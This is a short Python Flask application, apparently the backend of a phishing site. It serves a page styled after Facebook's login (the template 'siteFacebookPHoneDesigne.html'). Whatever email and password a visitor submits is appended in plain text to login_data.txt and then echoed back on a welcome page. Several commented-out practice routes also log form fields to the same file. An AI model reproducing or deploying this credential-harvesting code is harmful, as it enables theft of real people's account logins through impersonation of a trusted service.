from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/')
def index():
    return render_template("siteFacebookPHoneDesigne.html")

@app.route('/',  methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    with open("./login_data.txt", "a") as f:
        f.write("email: " + email + "\n")
        f.write("password: " + password + "\n")
        f.write("========================"+"\n")
    return render_template("Welcome.html" ,email_t=email ,password_t=password)

# @app.route('/',methods=['GET'])
# def index():
#     return ''' <form method="post" action="/login" >
#              <input type=text name=nom>
#              <input type=text name=prenom>

#              <input type=submit value=Login>
#         </form> 
#         '''

# @app.route('/login',  methods=['POST'])
# def login():
#     nom_p = request.form.get('nom')
#     prenom_p = request.form.get('prenom')
#     return "Bonjour M." + nom_p + "," + prenom_p

# @app.route('/admin/<ville>/ana/',  methods=['GET'])
# def admin(ville):
#     nom_p = request.args.get('nom')
#     prenom_p = request.args.get('prenom')
#     with open("./login_data.txt", "a") as f:
#         f.write("Username: " + nom_p + "\n")
#         f.write("Prenom: " + prenom_p + "\n")
#         f.write("Ville: " + ville + "\n")
#         f.write("========================"+"\n")
#     return "Bonjour M." + nom_p + "," + prenom_p


# @app.route('/login',  methods=['POST'])
# def login():
#     nom_p = request.form.get('nom')
#     prenom_p = request.form.get('prenom')
#     return "Bonjour M." + nom_p + "," + prenom_p


if __name__ == "__main__":
    app.static_folder = 'static'
    app.run(debug=True)
